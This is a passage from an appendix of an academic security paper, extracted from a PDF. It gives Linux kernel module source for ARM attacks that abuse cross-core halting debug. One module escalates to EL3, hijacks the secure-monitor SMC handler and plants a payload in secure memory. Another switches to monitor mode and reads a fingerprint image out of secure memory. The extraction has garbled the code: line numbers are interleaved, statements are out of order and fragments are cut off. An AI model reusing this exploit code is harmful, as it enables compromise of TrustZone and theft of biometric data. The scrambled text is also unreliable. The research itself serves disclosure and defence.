iowrite32((u32)(addr >> 32), debug + DBGDTRTX_OFFSET);
// Put the memory address to X0
// 0xd5330400  mrs X0, DBGDTR_EL0
execute_single_ins_via_itr(debug, 0xd5330400);
// Switch to memory access mode
u32 reg = ioread32(debug + EDSCR_OFFSET);
reg |= 0x100000;
iowrite32(reg, debug + EDSCR_OFFSET);
// Since the memory address will also automatically increase in
memory access mode, we only need to write to
DBGDTRRX_EL0
iowrite32(content[i], debug + DBGDTRRX_OFFSET);
for (int i = 0; i cti);
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
152
153
154
155
156
157
158
159
160
161
162
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
// Step 3: Override the instruction pointed by DLR_EL0 to trigger
the SMC exception once the processor exits the debug state
u64 dlr_el0 = buf[4];
// Save the instruction at the address pointed by DLR_EL0
u32 ins_at_dlr_el0_src = ∗((u32∗)dlr_el0);
// Override the instruction with the smc instruction
// 0xd4000003  smc #0
∗((volatile u32∗)dlr_el0) = 0xd4000003;
// Step 4: Privilege escalation
// 0xd4a00003  dcps3
execute_single_ins_via_itr(base−>debug, 0xd4a00003);
// Step 5: Override the EL3 exception table
// Find the address of EL3 exception table
// 0xd53ec000  mrs X0, VBAR_EL3
u64 vbar_el3 = read_single_register(base−>debug, 0xd53ec000);
// Save the original SMC exception handler in the exception table
u32 smc_handler_ins_src = read_memory_via_dcc(base−>debug,
vbar_el3 + 0x400);
// Craft a instruction to jump to the PAYLOAD_ADDRESS
u32 branch_ins = 0x14000000 | (((PAYLOAD_ADDRESS − (
vbar_el3 + 0x400)) >> 2) & 0x3ffffff);
// Override the SMC exception handler with the crafted instruction
write_memory_via_dcc(base−>debug, vbar_el3 + 0x400, &
branch_ins, sizeof(branch_ins) / 4);
// Step 6: Copy payload to secure memory
// Note that ins_at_dlr_el0_src and smc_handler_ins_src will be used
write_memory_via_dcc(base−>debug, PAYLOAD_ADDRESS,
for restoration in the PAYLOAD
PAYLOAD, sizeof(PAYLOAD) / 4);
struct reg_base ∗base = kmalloc(sizeof(t_reg_base), GFP_KERNEL);
// enable halting debug on processor 0
smp_call_function_single(0, enable_halting_debug, NULL, 1);
// Map the CTI and debug registers of processor 0 into memory
base−>cti = ioremap(CORE_0_CTI_BASE, 0x1000);
base−>debug = ioremap(CORE_0_DBG_BASE, 0x1000);
// Step 7: Restore context
restore_context(base−>debug, buf);
// Step 8: Restart the target processor
restart_by_ect(base−>cti);
206
207
208
209
210
211
212 }
213
214 static int __init attack_init(void) {
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230 }
231
232 static void __exit attack_cleanup(void) {}
233
234 module_init(attack_init);
235 module_exit(attack_cleanup);
// Manipulate processor 0 from processor 1
smp_call_function_single(1, payload_execution, base, 1);
iounmap(base−>cti);
iounmap(base−>debug);
kfree(param);
return 0;
C. Fingerprint Extraction
1 static u32 read_register_via_r0(void __iomem ∗debug, u32 ins) {
// Execute the ins to copy the target register to X0
execute_ins_via_itr(debug, ins);
// Copy R0 to the DCC register DBGDTRTX
// 0xee000e15  mcr p14, 0, R0, c0, c5, 0
execute_ins_via_itr(debug, 0xee000e15);
// Read the DBGDTRTX via the memory mapped interface
// Step 2: Save context
u64∗ buf = kmalloc(sizeof(u64) ∗ 6, GFP_KERNEL);
save_context(base−>debug, buf);
2
3
4
5
6
7
(cid:23)(cid:18)(cid:25)
Authorized licensed use limited to: IEEE Xplore. Downloaded on March 18,2021 at 12:43:28 UTC from IEEE Xplore.  Restrictions apply. 
return ioread32(debug + DBGDTRTX_OFFSET);
8
9 }
11 static u32 read_memory_via_dcc(void __iomem ∗debug, u32 addr) {
10
12
13
14
15
16
// movw R0, addr[15:0]
u32 inst = 0xe3000000 | ((addr & 0xf000) > 12) & 0xf0000) | ((addr >> 16) & 0
xfff);
execute_ins_via_itr(debug, inst);
// 0xe5910000  ldr R0, [R0]
execute_ins_via_itr(debug, 0xe5900000);
// read R0 via DBGDTRTX
// 0xee000e15  mcr p14, 0, R0, c0, c5, 0
return read_register_via_r0(debug, 0xee000e15);
17
18
19
20
21
22
23 }
25 static u32 output_ﬁngerprint_image(void __iomem ∗debug, u32 start,
24
u32 size) {
for (u32 i = 0; i  msr CPSR, R0
execute_ins_via_itr(debug, 0xe129f000);
// Step 10: Disable EDITR before exiting debug state
reg = ioread32(debug + DBGDSCR_OFFSET);
reg &= ~0x2000;
iowrite32(reg, debug + DBGDSCR_OFFSET);
// Step 11: Restart the target processor
iowrite32(0x2, debug + DBGDRCR_OFFSET);
reg = ioread32(debug + DBGDSCR_OFFSET);
while ((reg & 0x2) != 0x2) {
reg = ioread32(debug + DBGDSCR_OFFSET);
// Step 9: Revert R0 from stack
// 0xe49d0004  pop {R0}
execute_ins_via_itr(debug, 0xe49d0004);
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100 }
101
102
103 static int __init attack_init(void) {
104
105
106
107
108
109
110
111
112 }
113
114 static void __exit attack_cleanup(void) {}
115
116 module_init(attack_init);
117 module_exit(attack_cleanup);
iounmap(debug);
return 0;
}
// Map the debug registers of processor 0 into memory
void __iomem ∗debug = ioremap(CORE_0_DBG_BASE, 0x1000);
// Extract ﬁngerprint from processor 1
smp_call_function_single(1, ﬁngerprint_extraction, debug, 1);
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
// Step 2: Enable halting debug on the target processor
u32 reg = ioread32(debug + DBGDSCR_OFFSET);
reg |= 0x4000;
iowrite32(reg, debug + DBGDSCR_OFFSET);
// Step 3: Halt the target processor
iowrite32(0x1, debug + DBGDRCR_OFFSET);
reg = ioread32(debug + DBGDSCR_OFFSET);
while ((reg & 0x1) != 0x1) {
reg = ioread32(debug + DBGDSCR_OFFSET);
}
// Step 4: Enable the usage of DBGITR in debug state
reg |= 0x2000;
iowrite32(reg, debug + DBGDSCR_OFFSET);
// Step 5: Save R0 to stack since we are going to change R0
// 0xe52d0004  push {R0}
execute_ins_via_itr(debug, 0xe52d0004);
// Step 6: Switch to monitor mode to access secure resource
// 0xe10f0000  mrs R0, CPSR
u32 cpsr = read_register_via_r0(debug, 0xe10f0000);
// 0xe3c0001f  bic R0, R0, 0x1f
execute_ins_via_itr(debug, 0xe3c0001f);
// 0xe3800016  orr R0, R0, 0x16
execute_ins_via_itr(debug, 0xe3800016);
// 0xe129f000  msr CPSR, R0
execute_ins_via_itr(debug, 0xe129f000);
// Step 7: Read the ﬁngerprint image
u32 addr = read_memory_via_dcc(debug, 0x2efad510);
u32 size = read_memory_via_dcc(debug, 0x2ef7f414);
output_ﬁngerprint_image(debug, addr, size);
// Step 8: Switch back to previous cpu mode
// 0xe10f0000  mrs R0, CPSR
read_register_via_r0(debug, 0xe10f0000);
// 0xe3c0001f  bic R0, R0, 0x1f
(cid:23)(cid:18)(cid:26)
Authorized licensed use limited to: IEEE Xplore. Downloaded on March 18,2021 at 12:43:28 UTC from IEEE Xplore.  Restrictions apply.